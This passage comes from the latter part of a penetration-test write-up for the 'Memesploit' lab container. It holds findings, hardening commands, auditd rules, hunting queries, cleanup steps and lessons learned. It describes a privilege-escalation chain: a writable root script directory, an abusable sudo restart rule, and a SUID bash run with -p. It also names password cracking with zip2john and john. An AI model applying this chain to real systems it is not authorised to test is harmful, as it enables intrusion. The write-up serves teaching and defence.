* **Impact:** interactive shell on the host; credential reuse across accounts/services.
* **CVSS:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` ≈ **8.8**
* **Fix:** remove credentials from disk, rotate all exposed secrets, disable SSH password auth in favour of keys, unique credentials per service.

### F-05 — Overly permissive `NOPASSWD` sudo rule 🔴 Critical

* **Evidence:** `(ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart`.
* **Impact:** unprivileged user can force execution of a root init script whose helpers are attacker-writable → root.
* **CVSS:** `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` ≈ **8.8**
* **Fix:** remove the rule, or replace it with a root-owned immutable wrapper that validates the unit/script path; require a password; never grant `service`/`systemctl` over mutable code.

### F-06 — Group-writable directory containing root-executed scripts 🔴 Critical

* **Evidence:** `drwxrwx--- root security /etc/login_monitor`, no sticky bit; `memesploit ∈ security`.
* **Impact:** file replacement → arbitrary code execution as root (**primary escalation root cause**).
* **CVSS:** `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` ≈ **8.8**
* **Fix:** `chown -R root:root`, `chmod 0750` on the directory and `0755`/`0640` on contents; remove group write; if group write is unavoidable, set the sticky bit and audit ownership changes.

### F-07 — `/tmp` permits SUID execution 🟠 Medium

* **Evidence:** `/tmp/root-bash` created with mode `-rwsr-sr-x root root` and executed successfully.
* **Impact:** durable, reboot-surviving root primitive; trivially reusable by any local user.
* **CVSS:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` ≈ **7.8**
* **Fix:** mount `/tmp` and `/dev/shm` with `nosuid,noexec,nodev`; alert on new SUID files; periodic SUID inventory/diffing.

### F-08 — SSH password authentication enabled, no MFA 🟠 Medium

* **Evidence:** password-based SSH login succeeded for `memesploit`.
* **Impact:** any leaked/guessed password converts directly into shell access.
* **Fix:** `PasswordAuthentication no`, `PermitRootLogin no`, key-based auth, MFA, `fail2ban`, source-IP allow-listing.

---

## 7. Remediation & Hardening

### 7.1 Priority roadmap

| Priority | Action | Findings | Effort | Target |
|----------|--------|----------|--------|--------|
| **P0** | Remove group write from `/etc/login_monitor`; restore `root:root` ownership | F-06 | Low | Immediate |
| **P0** | Remove/replace the `NOPASSWD` service-restart sudo rule | F-05 | Low | Immediate |
| **P0** | Rotate `memehydra` + `memesploit` credentials; purge `secret.txt` / `secret.zip` | F-02, F-03, F-04 | Low | Immediate |
| **P1** | Disable SMB null sessions & anonymous enumeration; firewall 139/445 | F-01 | Low | 24 h |
| **P1** | SSH key-only authentication + `fail2ban` + MFA | F-08 | Medium | 72 h |
| **P1** | Mount `/tmp`, `/dev/shm`, `/var/tmp` with `nosuid,noexec,nodev`; SUID baseline audit | F-07 | Low | 72 h |
| **P2** | Password policy with site-vocabulary deny-list; secrets manager; least-privilege sudo review | F-02, F-05 | Medium | 2 weeks |
| **P2** | File-integrity monitoring + auditd rules on service directories and sudoers | All | Medium | 2 weeks |

### 7.2 Concrete hardening commands

```bash
# --- F-06: fix ownership & permissions on root-executed content ---
sudo chown -R root:root /etc/login_monitor
sudo chmod 0750 /etc/login_monitor
sudo chmod 0755 /etc/login_monitor/*.sh
sudo chmod 0640 /etc/login_monitor/*.conf
sudo chmod 0755 /etc/init.d/login_monitor
sudo chown root:root /etc/init.d/login_monitor

# --- F-05: review and remove the dangerous sudo grant ---
sudo visudo -c                       # syntax-check before/after edits
sudo grep -RIn 'NOPASSWD' /etc/sudoers /etc/sudoers.d/
# Delete or replace: (ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
# Prefer a root-owned, non-writable wrapper with a fixed, validated script path.

# --- F-07: mount hardening (fstab) ---
# tmpfs /tmp      tmpfs defaults,nosuid,noexec,nodev,mode=1777 0 0
# tmpfs /dev/shm  tmpfs defaults,nosuid,noexec,nodev           0 0
sudo find / -xdev -perm -4000 -type f -printf '%M %u %g %p\n' 2>/dev/null | sort

# --- F-01: Samba hardening (/etc/samba/smb.conf) ---
# [global]
#   restrict anonymous = 2
#   map to guest = never
#   guest account = nobody
#   server min protocol = SMB2_10
#   smb encrypt = required
#   hosts allow = 127.0.0.1 10.0.0.0/24
sudo testparm && sudo systemctl restart smbd

# --- F-08: SSH hardening (/etc/ssh/sshd_config) ---
# PasswordAuthentication no
# PermitRootLogin no
# PubkeyAuthentication yes
# MaxAuthTries 3
# AllowUsers memesploit@10.0.0.*
sudo sshd -t && sudo systemctl reload ssh
```

### 7.3 Architectural recommendations

1. **Immutable service code.** Root-executed scripts should live on read-only/immutable paths
   (`chattr +i`, package-managed, or a read-only bind mount) — never in a group-writable directory.
2. **Never delegate mutable code through sudo.** If a restart must be delegated, wrap it in a
   root-owned binary that hard-codes and validates the target, and log every invocation.
3. **Secrets never touch shares.** Use a vault/secret manager with short-lived, scoped credentials.
4. **Assume public content is a wordlist.** Feed site vocabulary into a password deny-list at provisioning time.
5. **Defence in depth that actually layers.** A weak ZIP password inside a weak-password share is one layer, not two.

---

## 8. Detection Engineering (Blue Team Notes)

### 8.1 High-fidelity signals from this exact chain

| Signal | Log source | Why it is reliable |
|--------|-----------|--------------------|
| Burst of `STATUS_LOGON_FAILURE` for one account from one IP, then a success | Samba logs / `auth.log` | Dictionary attack signature; the trailing success is the compromise moment |
| Null-session user/share enumeration (`NT_STATUS_ACCESS_DENIED` on shares + successful RID lookups) | Samba `log.smbd` | Reconnaissance preceding credential attacks |
| `sudo … /usr/sbin/service login_monitor restart` by a non-admin user | `auth.log` / auditd `EXECVE` | Rare, explicitly granted, and directly precedes escalation |
| **Owner change** on a file under `/etc/login_monitor` (root → uid≥1000) | auditd `PATH`/`FATTR` | The ownership-swap primitive; near-zero false positives |
| `unlink` + `rename` sequence in a service config directory by a non-root user | auditd | Copy-delete-rename tradecraft |
| New SUID/SGID file created in `/tmp` | auditd `chmod`/`fchmodat`, FIM | Classic local root persistence |
| Execution of a SUID bash with `-p` | auditd `EXECVE` (`euid=0`, `auid>=1000`) | Direct root-shell indicator |
| SSH password login immediately after a service restart | `auth.log` correlation | The payload trigger used in this engagement |

### 8.2 auditd rules

```bash
# /etc/audit/rules.d/memesploit-hardening.rules
-w /etc/login_monitor        -p wa  -k login_monitor_tamper
-w /etc/init.d/login_monitor -p wa  -k init_script_tamper
-w /etc/sudoers              -p wa  -k sudoers_change
-w /etc/sudoers.d/           -p wa  -k sudoers_change
-w /etc/samba/smb.conf       -p wa  -k samba_config_change

# SUID/SGID bit manipulation
-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -F auid!=4294967295 -k suid_bits
-a always,exit -F arch=b32 -S chmod,fchmod,fchmodat -F auid>=1000 -F auid!=4294967295 -k suid_bits

# Privileged execution originating from a normal login session
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=4294967295 -k root_exec
```

```bash
sudo augenrules --load && sudo systemctl restart auditd
sudo ausearch -k login_monitor_tamper -i
sudo ausearch -k suid_bits -i
```

### 8.3 Hunting queries (pseudo-SIEM)

```text
# 1) SMB brute force followed by success
process=smbd AND event="STATUS_LOGON_FAILURE"
| bucket by src_ip, user, 5m
| where failures > 20
| join subsequent event="STATUS_SUCCESS" within 5m

# 2) Ownership change on root-executed scripts
auditd.key="login_monitor_tamper" AND syscall IN (unlink, rename, chmod, chown)
AND auid >= 1000 AND file.owner changes_to >= 1000

# 3) SUID payload in world-writable directories
file.created=true AND path IN ("/tmp","/var/tmp","/dev/shm")
AND file.mode MATCHES "^[^ ]*s"

# 4) Delegated service restart abuse
process.name="sudo" AND command CONTAINS "service" AND command CONTAINS "restart"
AND user.is_admin = false
```

### 8.4 Quick compromise-assessment one-liners

```bash
# Unexpected SUID/SGID binaries
sudo find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -ls 2>/dev/null

# Non-root-owned files in root-executed service paths
sudo find /etc/login_monitor /etc/init.d ! -user root -ls 2>/dev/null

# Who can write to service directories?
sudo find /etc -maxdepth 2 -type d -perm -g+w ! -perm -1000 -ls 2>/dev/null

# Recent successful logins & authentication failures
last -a | head -20
sudo grep -Ei 'accepted|failed password' /var/log/auth.log | tail -50
```

---

## 9. Post-Engagement Cleanup

Professional engagements end with the target restored and every artifact accounted for.

```bash
# --- On the target (as root) ---
rm -f /tmp/root-bash                                  # remove the SUID payload
cp -a /tmp/actionban.sh.orig /etc/login_monitor/actionban.sh
chown root:root /etc/login_monitor/actionban.sh
chmod 0755 /etc/login_monitor/actionban.sh
rm -f /tmp/actionban.sh.orig /tmp/block_log.txt
service login_monitor restart
ls -al /etc/login_monitor /tmp                        # verify restoration

# --- On the attacker box ---
shred -u loot/zip.hash wordlists/final_cewl.txt wordlists/full_words.txt 2>/dev/null
rm -f secret.zip secret.txt
rm -rf ~/.john/john.pot                               # cracked secrets are sensitive
```

**Cleanup checklist**

* [ ] SUID payload removed; SUID baseline matches pre-test inventory
* [ ] `actionban.sh` content, owner and mode restored (hash-verified)
* [ ] No attacker SSH keys, cron jobs, users or services left behind
* [ ] Service functionality verified after restoration
* [ ] Cracked hashes, wordlists and loot securely deleted or encrypted at rest
* [ ] All lab credentials rotated / container redeployed from a clean image
* [ ] Evidence retained per retention policy (hashes + timestamps, no live secrets)

---

## 10. Evidence & Artifacts

| ID | Artifact | Origin | Purpose |
|----|----------|--------|---------|
| E-01 | `scans/nmap_initial.txt` | `nmap -Pn --open -sCV` | Attack-surface baseline |
| E-02 | `scans/gobuster_80.txt` | `gobuster dir` | Documented negative result (web) |
| E-03 | `scans/enum4linux.txt` | `enum4linux -a` | Account + share disclosure (F-01) |
| E-04 | `wordlists/final_cewl.txt` | `cewl` + `tail` | Context-derived dictionary |
| E-05 | `evidence/netexec_smb.log` | `netexec smb` | Valid credential proof (F-02) |
| E-06 | `loot/secret.zip` (+ `.sha256`) | `smbclient get` | Sensitive file at rest (F-03) |
| E-07 | `loot/zip.hash` | `zip2john` | Offline cracking input |
| E-08 | `evidence/john_output.txt` | `john --wordlist` | Recovered passphrase |
| E-09 | `loot/secret.txt` | `unzip` | Plaintext credentials (F-04) |
| E-10 | `evidence/sudo_-l.txt` | `sudo -l` | Dangerous grant (F-05) |
| E-11 | `evidence/ls_login_monitor.txt` | `ls -al` | Group-writable directory (F-06) |
| E-12 | `evidence/ls_tmp_suid.txt` | `ls -al /tmp` | Root-owned SUID payload (F-07) |
| E-13 | `evidence/root_id.txt` | `id`, `whoami`, `root.txt` | Proof of UID 0 compromise |

**Integrity handling:**

```bash
sha256sum evidence/* loot/* > evidence/MANIFEST.sha256
sha256sum -c evidence/MANIFEST.sha256
```


---

## 11. Lessons Learned & Analyst Errata

### 11.1 Transferable offensive lessons

1. **Content is an attack surface.** A marketing page can be a password list. CeWL before `rockyou`.
2. **Enumerate identities before attacking secrets.** RID cycling removed 50% of the credential problem for free.
3. **When a targeted wordlist fails, fix the tokenizer — not the keyspace.** CeWL split `memesploit_ctf`;
   `grep -oE '[a-zA-Z0-9/_-]{3,}'` preserved it. This single insight was the difference between failure and success.
4. **Directory permissions beat file permissions.** `rwx` for your group on a directory means you can
   *replace* root-owned files, even when you cannot edit them. Always check the **parent**, and check for the sticky bit.
5. **"Harmless" sudo verbs are not harmless.** `service <x> restart` = "execute whatever code that init script points at".
   Delegate operations only over immutable code.
6. **Understand triggers, don't guess them.** Event-driven handlers (`actionban.sh`) require the *event*,
   not just a service restart. Reading the init/daemon logic saves hours.
7. **`bash -p` or it didn't happen.** SUID bash silently drops privileges without privileged mode.
8. **Document negative results.** The empty `gobuster` run is what justified the SMB pivot.

### 11.2 Errata — corrections applied to the original field notes

| Original wording | Corrected / clarified |
|------------------|-----------------------|
| "password spoofing attack" | **Password guessing / dictionary attack** (MITRE T1110.001) |
| "sign up / log in one of the directories" | **Authenticate to an SMB share** |
| "we change it and create a secret.hash" | **`zip2john secret.zip > zip.hash`** — extract the hash, never modify the archive |
| "create a new list using all possible words" | **Separator-preserving token extraction** from page text (targeted, not exhaustive) |
| "this user has root permissions" | The user has a **narrow sudo grant** that is *abusable* to obtain root — not root rights |
| SMB1 negotiation errors treated as a blocker | **Expected**: SMBv1 is disabled; SMB2/3 enumeration succeeded |
| "user.txt is hashed" | Flag stored **encoded/hashed**; decoding step must be documented, not assumed |
| `chmod +s` | Works, but **`chmod 4755`** (SUID only) is cleaner and less noisy |
| No backup / cleanup documented | Added **pristine backup + full restoration procedure** ([§9](#9-post-engagement-cleanup)) |

---



## 12. References

* MITRE ATT&CK — Enterprise Matrix: https://attack.mitre.org/
* GTFOBins — sudo / service / SUID abuse patterns: https://gtfobins.github.io/
* HackTricks — Linux privilege escalation & SMB enumeration: https://book.hacktricks.xyz/
* CeWL — custom wordlist generator (Robin Wood / DigiNinja): https://digi.ninja/projects/cewl.php
* John the Ripper (Openwall) — `zip2john`, PKZIP format: https://www.openwall.com/john/
* NetExec (successor to CrackMapExec): https://www.netexec.wiki/
* enum4linux-ng: https://github.com/cddmp/enum4linux-ng
* Samba `smb.conf` hardening reference: https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html
* `sudoers(5)` / `visudo(8)` manual pages
* `bash(1)` — privileged mode (`-p`) and SUID behaviour
* CVSS v3.1 specification: https://www.first.org/cvss/v3.1/specification-document
* DockerLabs (lab provider): https://dockerlabs.es/

---

## 15. Disclaimer & License

**Disclaimer.** This document is published for **educational and defensive purposes only**. All testing
was conducted against an isolated, intentionally vulnerable laboratory container owned and deployed
by the author, with full authorization. No production system, third-party network or real user data was
involved. The techniques described here must only be used on systems you own or are **explicitly and
contractually authorized** to test. Unauthorized access to computer systems is a criminal offense in
most jurisdictions. The author accepts **no liability** for misuse, damage or legal consequences arising
from the application of this material.

**License.** Report text and scripts released under the **MIT License**. Tool names, logos and the
Memesploit lab remain the property of their respective owners.

---

<div align="center">

## 👤 Author

**`dani-kl`**
Red Team Engineer · Offensive Security · Penetration Testing



*Report ID:* `RT-2026-MEMESPLOIT-001` · *Version:* `1.0` · *Status:* `Final`

**Root obtained. Target restored. Knowledge shared.** 🚩

*If this writeup helped you, consider leaving a ⭐ on the repository.*

</div>
